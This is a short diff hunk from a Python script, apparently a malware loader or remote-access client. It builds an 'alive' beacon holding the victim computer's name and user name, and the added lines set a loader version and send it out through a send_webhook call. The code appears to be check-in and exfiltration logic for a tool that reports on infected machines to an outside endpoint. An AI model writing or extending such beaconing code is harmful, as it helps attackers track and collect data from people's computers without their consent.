@@ -269,6 +269,13 @@ if __name__ == "__main__":
     ALIVE_DATA = json.dumps({'info':'alive','script':'user','computer':COMPUTER_NAME,'username':USER_NAME})
 
     FIRST_MESSAGE = True
+
+    try:
+        LOADER_VERSION = LOADER_VERSION
+    except:
+        LOADER_VERSION = "1.0"
+
+    send_webhook(LOADER_VERSION)
     
     loop_function_list = [
         {
